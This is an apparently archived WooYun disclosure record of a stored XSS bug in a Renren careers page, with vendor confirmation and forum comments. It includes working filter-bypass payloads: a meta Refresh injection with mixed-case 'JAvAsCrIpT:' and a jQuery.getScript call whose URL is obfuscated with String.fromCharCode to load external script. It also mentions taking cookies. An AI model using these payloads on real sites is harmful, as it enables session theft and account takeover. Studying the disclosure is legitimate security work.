{"id": 15407, "wybug_id": "wooyun-2012-014825", "wybug_title": "人人网某分站存储型XSS", "wybug_corp": "人人网", "wybug_author": "Drizzle.Risk", "wybug_date": "2012-11-15 23:29", "wybug_open_date": "2012-12-30 23:30", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "利用技巧", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-30：\t细节向公众公开  简要描述： 过滤不严导致XSS... 详细说明：  本来是去找工作的，谁知道顺便挖出来个XSS..-_-开始先测试各种标签..发现过滤器基于白名单，input,img木有过滤...然后发现<input type=\"submit\" />会侧漏.. 过滤器弱爆了...\n\n\n\n\n\n在这个地方测试了一些时间,发先不好利用,然后突然发现个好玩的东东..\n\n测试中发现不能闭合，不过滤<和\",但是过滤>\n\n接着从Refresh入手...观察观察\n\n自己的content被和谐了...\n\n想办法用他的content,分开写就OK了..\n\n猥琐的过滤器,冒号被换成中文的了...经过测试，在别的地方，冒号不会被替换...目测是javascript的问题..\n改为JAvAsCrIpT:\n成功跨...过滤器弱爆了...\n\n继续调用外部js,有字数限制..\n\n目测支持JQuery..试试\n//http://127.0.0.1/1.js0;url=JAvAsCrIpT:jQuery.getScript(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,49,46,106,115))\" http-equiv=\"Refresh\"\n\n\nOK了... 顺便用JQ清空代码...\n\n哦对了,cookie:\n\nOver   漏洞证明：  http://xiaozhao.renren.com/careerguide/edit发帖然后改包..改成如下即可\n0;url=JAvAsCrIpT:alert(Drizzle.Risk)\" http-equiv=\"Refresh\"\n现在找工作都先问乌云ID.. 赶紧申请个...第一次发帖.. 写的详细点.. -_-   修复方案：  @人人网,你懂的..   版权声明：转载请注明来源 Drizzle.Risk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-11-16 09:56 厂商回复： 感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-11-15 23:35 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  利用代码少了单引号...  -_-     \n     2012-11-16 00:16 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  自己顶自己啊？辛苦~~    \n     2012-12-17 11:30 |    \t\t鉴澈 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 搞搞软基，搞搞硬基，基基复鸡鸡)\t\t \n  话说洞主找到工作没    \n     2012-12-21 17:50 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @鉴澈 找到了... ;-)    \n     2013-01-04 21:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  在哪工作了？待遇如何    \n     2013-01-05 00:42 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  @Drizzle.Risk  在哪呢    \n     2013-01-09 10:59 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @猴子 某公司...扫地... -_-    \n     2013-01-09 11:00 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @px1624 呃，某公司.. 0.0    \n     2013-04-27 11:31 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  @xsser 漏洞确认了但却没有补，怎么破..    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}